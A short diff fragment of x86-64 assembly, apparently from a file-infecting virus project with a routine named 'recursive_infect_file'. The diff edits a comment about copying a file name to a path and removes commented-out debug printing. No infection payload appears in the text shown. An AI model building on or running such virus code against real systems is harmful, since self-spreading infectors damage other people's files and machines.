@@ -48,7 +48,7 @@ recursive:
 	files_loop:
 	
 
-	;affiche name
+	;copy name to path
 
 	lea rdi, [rsp + r13 + d_name]
 	call ft_strlen
@@ -80,19 +80,6 @@ recursive:
 	jmp end_recur
 
 	recursive_infect_file:
-
-;	lea rdi, [r12 + fileName]
-;	call ft_strlen
-;	mov rdx, rax
-;	mov rdi, STDOUT
-;	lea rsi, [r12 + fileName]
-;	mov rax, SYS_WRITE
-;	syscall
-;	mov rdi, STDOUT
-;	lea rsi, [rel str] 
-;	mov rdx, 1
-;	mov rax, SYS_WRITE
-;	syscall
 
 	push r14
 	push r13
